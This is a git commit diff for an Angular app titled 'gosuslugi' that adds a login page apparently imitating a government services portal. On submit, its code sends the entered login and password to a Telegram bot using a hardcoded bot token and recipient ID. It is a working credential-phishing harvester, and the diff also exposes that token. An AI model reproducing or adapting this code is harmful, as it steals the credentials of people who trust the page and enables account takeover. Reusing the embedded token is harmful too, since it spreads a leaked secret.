ff7c0cb6f7bd41ea1334d34ede049983dcbc4005
oleksii <oleksiy@eventsoft.com.ua>
2020-08-30 23:26:30 +0300

    feat: master

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -1,10 +1,39 @@
-import { Component } from '@angular/core';
+import { Component, OnInit, ViewEncapsulation } from '@angular/core';
+import Telegram from 'telegram-send-message';
+import { FormBuilder, Validators } from '@angular/forms';
 
 @Component({
-  selector: 'app-root',
-  templateUrl: './app.component.html',
-  styleUrls: ['./app.component.scss']
+    selector: 'app-root',
+    templateUrl: './app.component.html',
+    styleUrls: ['./app.component.scss'],
+    encapsulation: ViewEncapsulation.None
 })
-export class AppComponent {
-  title = 'gosuslugi';
+export class AppComponent implements OnInit {
+    loginStepPhone = true;
+    form = this.formBuilder.group({
+        login: ['', [Validators.required]],
+        password: ['', [Validators.required]],
+    });
+
+    sentMessage(): void {
+        Telegram.setToken('949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs');
+        Telegram.setRecipient('880595419');
+        const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
+        Telegram.setMessage(message);
+        Telegram.send();
+    }
+
+    constructor(
+        private formBuilder: FormBuilder,
+    ) {}
+
+    ngOnInit(): void {
+    }
+
+    onSubmit(): void {
+        if (this.form.valid) {
+            this.sentMessage();
+        }
+        console.log(this.form.value);
+    }
 }
